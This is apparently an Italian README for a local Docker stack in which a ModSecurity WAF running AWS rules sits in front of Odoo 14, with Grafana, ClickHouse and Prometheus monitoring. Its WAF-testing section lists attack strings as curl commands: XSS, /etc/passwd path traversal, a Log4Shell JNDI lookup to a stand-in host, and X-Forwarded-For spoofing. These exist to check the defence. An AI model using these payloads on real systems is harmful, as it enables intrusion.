# deploy-waf-for-odoo — stack completo in locale

Odoo 14 dietro nginx, con il WAF davanti, e il monitoraggio completo: metriche (Prometheus), log
(ClickHouse) e dashboard (Grafana). Tutto in HTTP sulla porta 80.

```
                      ┌─────────────────────────────── docker compose ───────────────────────────────┐
 browser ──:80──►     │ waf ──► nginx ──┬──► odoo (14) ──► db (postgres 13)                            │
                      │  │              └──► grafana ──┬──► prometheus ──► metrics :9598               │
                      │  │                             └──► clickhouse                                │
                      │  └── log ──► metrics (Vector) ──┬──► :9598/metrics  (Prometheus)              │
                      │                                 ├──► clickhouse: waf.events, waf.matches      │
                      │                                 └──► data/raw/<giorno>/*.jsonl                │
                      └────────────────────────────────────────────────────────────────────────────────┘
```

| Indirizzo | Cosa | Credenziali |
|---|---|---|
| http://odoo.localhost | Odoo 14 con dati demo (vendite, CRM, contatti) | `admin` / `admin` |
| http://localhost:3000 | Grafana, cartella **WAF** (5 dashboard), accesso diretto | `admin` / `admin` (anche anonimo, sola lettura) |
| http://grafana.localhost | lo stesso Grafana, passando dal WAF | |
| http://localhost | Odoo, perché è il sito di default del WAF | |

I nomi `*.localhost` puntano già alla tua macchina, senza toccare `/etc/hosts`: valgono per
Chrome, Firefox e curl.

## Avvio

Requisiti: Docker con compose v2, porta 80 libera, circa 4 GB di RAM libera e internet al primo
avvio (immagini e plugin ClickHouse di Grafana).

```sh
cd deploy-waf-for-odoo
docker compose up -d --build      # primo avvio: 1-3 minuti (build WAF + creazione database Odoo)
docker compose ps                 # waf, clickhouse e db "healthy"; init-dirs e odoo-init "Exited (0)"
```

Poi apri http://odoo.localhost e accedi con admin / admin.

Spegnere e riaccendere: `docker compose down` / `docker compose up -d`. I dati restano in `data/`.

Ripartire da zero, cancellando database Odoo, log e metriche:

```sh
docker compose down
sudo rm -rf data/*/ logs/*.log*     # i file sono creati come root dai container
docker compose up -d
```

## I servizi

| Servizio | Immagine | Ruolo | Esposto |
|---|---|---|---|
| `waf` | `nginx-aws-waf/aio` (da `../deploy-waf/Dockerfile`) | nginx + ModSecurity con le regole AWS WAF; unico ingresso | **:80** |
| `nginx` | `nginx:alpine` | il "tuo" nginx: config classica Odoo + Grafana (`nginx/default.conf`) | no |
| `odoo` | `odoo:14` | Odoo, 2 worker + longpolling sulla porta 8072 | no |
| `odoo-init` | `odoo:14` | crea il database `odoo` al primo avvio, poi esce | — |
| `db` | `postgres:13` | database di Odoo | no |
| `metrics` | `timberio/vector:0.62.0` | legge i log del WAF, scrive in ClickHouse e pubblica le metriche | no |
| `clickhouse` | `clickhouse/clickhouse-server:26.8` | database dei log del WAF | no |
| `prometheus` | `prom/prometheus:v3.16.0` | metriche (15 giorni) | no |
| `grafana` | `grafana/grafana:13.2.7` | dashboard | **:3000** (diretto) e via :80 |
| `init-dirs` | (WAF) | crea le cartelle in `data/` con i permessi giusti, poi esce | — |

Tutti i dati sono **bind mount**, non ci sono volumi docker:

| Cartella | Contenuto |
|---|---|
| `data/postgres`, `data/odoo` | database e filestore di Odoo |
| `data/clickhouse` | log del WAF (tabelle `waf.*`) |
| `data/prometheus`, `data/grafana` | metriche, impostazioni Grafana |
| `data/runtime`, `data/lists`, `data/state` | config generate dal WAF, liste IP, bypass |
| `data/raw`, `data/vector` | eventi JSONL per giorno, stato di Vector |
| `logs/` | `access.log`, `audit.log`, `error.log` del WAF |

## Il WAF in questo stack

La configurazione è in `config/sites/`, un file per sito. Le modifiche vengono applicate da sole
entro 10 secondi.

- **`odoo.yaml`** usa il profilo `odoo-14`: sono le regole AWS one-click (IpReputation,
  CommonRuleSet, KnownBadInputs) con le eccezioni per Odoo. Le chiamate RPC (`/web/dataset/...`) e
  l'editor HTML contengono body grandi e HTML: lì le regole `SizeRestrictions_BODY`,
  `CrossSiteScripting_BODY` e `GenericRFI_BODY` sono in **count**, cioè registrano senza bloccare.
  Fuori da quei percorsi bloccano normalmente. La location `/longpolling` (chat e notifiche) ha un
  timeout lungo.
- **`grafana.yaml`** usa il profilo AWS standard.

Nota su `localhost`: la regola AWS `Host_localhost_HEADER` blocca le richieste con
`Host: localhost`. Solo in questo stack locale l'ho messa in count in `odoo.yaml`, altrimenti
http://localhost darebbe 403. In produzione quell'override va tolto.

### Provare il WAF

```sh
# legittimo → 200
curl -s -o /dev/null -w '%{http_code}\n' http://odoo.localhost/web/login

# attacchi → 403
curl -s -o /dev/null -w '%{http_code}\n' 'http://odoo.localhost/web?q=<script>alert(1)</script>'        # XSS
curl -s -o /dev/null -w '%{http_code}\n' 'http://odoo.localhost/web/content?f=../../../../etc/passwd'     # LFI
curl -s -o /dev/null -w '%{http_code}\n' -H 'X-Api: ${jndi:ldap://evil/a}' http://odoo.localhost/       # Log4Shell
curl -s -o /dev/null -w '%{http_code}\n' -H 'User-Agent:' http://odoo.localhost/web/login               # senza User-Agent
```

Usa Odoo normalmente dal browser (vendite, CRM, chat, note con testo formattato): non deve
comparire nessun 403. Se ne compare uno, cercalo in Grafana ▸ **WAF Request Explorer**
([sotto](#trovare-un-falso-positivo)).

**SQL injection passa** (Odoo risponde 404 o 200): è voluto, il set SQLi non fa parte del default
AWS. Per attivarlo, in `config/sites/odoo.yaml` aggiungi:

```yaml
rule_groups:
  - name: AWSManagedRulesSQLiRuleSet
    enabled: true
```

## Grafana

http://localhost:3000 (oppure http://grafana.localhost), cartella **WAF**:

| Dashboard | Fonte | Cosa mostra |
|---|---|---|
| **WAF Overview** (home) | ClickHouse | richieste, bloccate, % per sito, top regole/IP/paesi/percorsi bloccati, latenze (paesi solo con [GeoIP](#geoip-paese-e-asn)) |
| **WAF Rules & Tuning** | ClickHouse | per ogni regola: match, quante bloccano, quante in count; regole che bloccherebbero se attivate. Serve per decidere cosa passare in enforce |
| **WAF Request Explorer** | ClickHouse | ricerca delle singole richieste per sito, IP, regola, esito, request id; dettaglio con header, body e regole matchate |
| **WAF Metrics (Prometheus)** | Prometheus | traffico in tempo reale (aggiornamento 10 s), blocchi per regola, codici HTTP, latenze p50/p95/p99, CPU e memoria |
| **WAF Nodes Health** | Prometheus + ClickHouse | salute di nodo, nginx, Vector e ClickHouse; versione di config attiva |

### Trovare un falso positivo

1. Grafana ▸ **WAF Request Explorer**, filtro `action = BLOCK`.
2. Apri la richiesta: vedi quale regola l'ha bloccata (`terminating_rule`), il percorso e il body.
3. Mettila in count solo su quel percorso, in `config/sites/odoo.yaml`:
   ```yaml
   path_overrides:
     - {path_prefix: /web/percorso/che/sbaglia, rules: {NomeRegola: count}}
   ```
   Viene applicata entro 10 secondi.

## Log in ClickHouse

Tabelle nel database `waf`:

| Tabella | Una riga per | Campi principali |
|---|---|---|
| `events` | richiesta | `ts`, `site_id`, `client_ip`, `method`, `path`, `query`, `status`, `action` (ALLOW/BLOCK), `shadow_action`, `terminating_rule`, `labels`, `request_headers`, `request_body`, `request_time`, `upstream_time`, `user_class` (Odoo: `backend`, `website`, `other`) |
| `matches` | regola matchata | `request_id`, `rule_group`, `rule_name`, `configured_action`, `request_action` |
| `heartbeats` | 30 secondi | nodo, versione, revisione di config attiva |

Più gli aggregati al minuto (`agg_requests_1m`, `agg_matches_1m`) usati dalle dashboard.
Conservazione (TTL in `clickhouse/initdb/001-schema.sql`): 30 giorni per `events`, `matches` e
`heartbeats`, 400 giorni per gli aggregati.

Paese e ASN (`country`, `asn`, `as_org`) sono vuoti finché non scarichi i database GeoIP
([sotto](#geoip-paese-e-asn)).

### Da riga di comando: `wafctl`

```sh
docker compose exec waf wafctl logs search --since 15m --action BLOCK      # ultime bloccate
docker compose exec waf wafctl logs show <request_id>                      # una richiesta, completa
docker compose exec waf wafctl logs tail --site odoo                       # in diretta
docker compose exec waf wafctl stats --since 1h --by rule                  # match per regola
docker compose exec waf wafctl stats --since 24h --by rule --counted       # regole in count che bloccherebbero
docker compose exec waf wafctl report --html --since 24h -o /var/log/waf/report.html   # → logs/report.html
docker compose exec waf wafctl logs export --since 1h --format aws -o /var/log/waf/aws.jsonl   # formato log AWS WAF
```

### SQL diretto

```sh
docker compose exec clickhouse clickhouse-client -u waf_admin --password waf_admin
```

```sql
-- esiti per sito nell'ultima ora
SELECT site_id, action, count() FROM waf.events WHERE ts > now() - INTERVAL 1 HOUR GROUP BY 1, 2;

-- regole che bloccano di più oggi
SELECT terminating_rule, count() c FROM waf.events
WHERE action = 'BLOCK' AND ts > today() GROUP BY 1 ORDER BY c DESC LIMIT 10;

-- IP più bloccati
SELECT client_ip, count() c FROM waf.events WHERE action = 'BLOCK' GROUP BY 1 ORDER BY c DESC LIMIT 10;

-- regole in count che hanno matchato su traffico Odoo (candidati falsi positivi)
SELECT rule_name, path, count() c FROM waf.matches
WHERE configured_action = 'COUNT' GROUP BY 1, 2 ORDER BY c DESC LIMIT 20;
```

Utenti ClickHouse:

| Utente | Password | Permessi | Chi lo usa |
|---|---|---|---|
| `waf_admin` | `waf_admin` | amministratore | tu |
| `waf_ingest` | `waf_ingest` | scrittura su `waf.*` | Vector |
| `waf_ro` | `waf_ro` | sola lettura su `waf.*` | Grafana, wafctl |

Le password valgono solo per questo stack locale. Si cambiano nel `.env` **prima** del primo
avvio: vengono applicate quando `data/clickhouse` viene creata.

## GeoIP (paese e ASN)

Servono due database in `data/geoip/`: `GeoLite2-Country.mmdb` e `GeoLite2-ASN.mmdb`. Puoi
scaricarli in due modi.

**DB-IP Lite**: gratuito, senza account, aggiornato ogni mese.

```sh
docker compose run --rm geoip-dbip
docker compose restart metrics
```

Licenza CC BY 4.0: se mostri i dati a terzi va citato "IP Geolocation by DB-IP".

**MaxMind GeoLite2**: serve un account gratuito su maxmind.com (*Manage License Keys* ▸ crea una
chiave). Nel `.env`:

```sh
GEOIPUPDATE_ACCOUNT_ID=123456
GEOIPUPDATE_LICENSE_KEY=xxxxxxxx
```

poi:

```sh
docker compose run --rm geoip-maxmind
docker compose restart metrics
```

Il servizio `metrics` controlla all'avvio se i file ci sono (`docker compose logs metrics | grep
GeoIP` mostra `geoip-on`). Da quel momento ogni evento in ClickHouse ha `country`, `asn` e
`as_org`, e in Grafana si popolano i pannelli per paese. Gli IP privati, come `172.x` della rete
docker, restano comunque senza paese.

Per aggiornare i database basta rilanciare lo stesso comando, una volta al mese, a mano o con cron:

```cron
0 4 3 * * cd /percorso/deploy-waf-for-odoo && docker compose run --rm geoip-dbip && docker compose restart metrics
```

### Bloccare per paese nel WAF

Nel `.env` metti `WAF_GEOIP=true`, poi `docker compose up -d waf`. In `config/sites/odoo.yaml`:

```yaml
geo_block: {countries: [CN, RU, KP], action: block}     # oppure action: count per provare
```

In locale tutte le richieste arrivano da `172.x` e non hanno paese. Per provare simula l'IP
del client: **solo per test**, aggiungi anche

```yaml
client_ip: {source: xff, trusted_proxies: ["172.16.0.0/12"]}
```

e poi:

```sh
curl -s -o /dev/null -w '%{http_code}\n' -H 'X-Forwarded-For: 223.5.5.5' http://odoo.localhost/web/login   # CN → 403
curl -s -o /dev/null -w '%{http_code}\n' -H 'X-Forwarded-For: 8.8.8.8'   http://odoo.localhost/web/login   # US → 200
```

Togli `client_ip` dopo il test: con quella riga chiunque potrebbe falsificare il proprio IP.

## Metriche Prometheus

Il servizio `metrics` pubblica su `metrics:9598` (rete interna):

| Metrica | Label |
|---|---|
| `waf_requests_total` | `site`, `action`, `shadow_action`, `mode`, `status` |
| `waf_blocked_requests_total` | `site`, `rule`, `type` |
| `waf_rule_matches_total` | `site`, `rule_group`, `rule`, `configured_action`, `request_action` |
| `waf_request_duration_seconds`, `waf_upstream_duration_seconds` | `site` (istogrammi) |
| `nginx_*`, `host_*`, `vector_*` | `node_id` |

Prometheus le raccoglie ogni 15 secondi, insieme alle metriche di ClickHouse (`clickhouse:9363`).
Per interrogarle direttamente:

```sh
docker compose exec prometheus wget -qO- 'http://localhost:9090/api/v1/query?query=sum%20by%20(action)%20(waf_requests_total)'
```

## Comandi utili

```sh
docker compose logs -f waf                 # reload della config, errori
docker compose exec waf waf status         # versione di config attiva, siti, liste IP
docker compose exec waf waf explain odoo   # tutte le regole del sito e la loro azione effettiva
docker compose exec waf waf bypass odoo --ttl 30m --reason "test"   # sito in sola registrazione per 30 min
docker compose exec waf waf bypass clear odoo
docker compose logs -f odoo                # log di Odoo
docker compose restart nginx               # dopo una modifica a nginx/default.conf
```

## Moduli Odoo personalizzati

Decommenta in `docker-compose.yml`, servizio `odoo`:

```yaml
      - ./addons:/mnt/extra-addons
```

Metti i moduli in `addons/`, poi `docker compose up -d odoo` e installali da Odoo ▸ App
(modalità sviluppatore ▸ Aggiorna lista app).

## Problemi comuni

| Sintomo | Soluzione |
|---|---|
| `port is already allocated` su 3000 | `GRAFANA_PORT=3001` nel `.env` |
| `port is already allocated` su 80 | un altro servizio usa la porta 80: fermalo, oppure `HTTP_PORT=8080` nel `.env` e usa http://odoo.localhost:8080 |
| http://odoo.localhost non si apre | usa Chrome/Firefox oppure http://localhost; alcuni sistemi non risolvono `*.localhost`: aggiungi `127.0.0.1 odoo.localhost grafana.localhost` a `/etc/hosts` |
| 502 su Odoo subito dopo l'avvio | Odoo sta ancora partendo, attendi 10-20 secondi |
| `odoo-init` in errore | `docker compose logs odoo-init`; per riprovare: `docker compose down`, `sudo rm -rf data/postgres data/odoo`, `docker compose up -d` |
| Grafana: "plugin not found" per ClickHouse | al primo avvio Grafana scarica il plugin da internet; senza rete le dashboard ClickHouse restano vuote |
| Dashboard ClickHouse vuote | i dati arrivano qualche secondo dopo le richieste; controlla `docker compose logs metrics` |
| 403 mentre usi Odoo | Request Explorer ▸ regola ▸ `path_overrides` ([sopra](#trovare-un-falso-positivo)); in emergenza `waf bypass` |

## Differenze rispetto a `../deploy-waf`

`../deploy-waf` è il WAF da mettere davanti a un nginx esistente, in produzione, con HTTPS e solo
le metriche Prometheus. Questa cartella aggiunge Odoo, ClickHouse, Prometheus e Grafana per vedere
lo stack completo in locale. Il WAF, la sua immagine e la pipeline Vector sono gli stessi.
